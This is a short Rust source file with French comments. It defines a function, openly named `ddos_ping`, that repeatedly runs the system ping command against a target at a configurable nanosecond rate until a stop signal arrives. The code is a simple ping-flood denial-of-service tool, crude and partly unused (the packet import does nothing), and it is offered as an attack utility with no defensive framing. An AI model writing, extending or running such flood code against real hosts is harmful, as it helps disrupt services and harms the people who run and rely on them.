use std::process::Command;
use std::time::Duration;
use pnet::packet::Packet;
use tokio::sync::mpsc;
use tokio::time::sleep;


fn ping(target: String){
    let output = Command::new("ping")
        .arg("-c")
        .arg("1")
        .arg("-W")
        .arg("0.1")
        .arg(target)
        .output()
        .expect("Échec de l'exécution de la commande");

    // Afficher la sortie de la commande
    println!("ping !");

}

pub(crate) async fn ddos_ping(rx: &mut mpsc::Receiver<()>, target: String, rate_limit: u64) {

    let mut cmp = 0;

    loop {
        tokio::select! {
            _ = sleep(Duration::from_nanos(rate_limit)) => {
                println!("cmp = {}", cmp);
                ping(target.clone());
                cmp += 1;
            }
            _ = rx.recv() => {
                // Arrêter d'afficher des messages lorsque le signal est reçu
                println!("Arret fin du temps");
                break;
            }
        }
    }





}
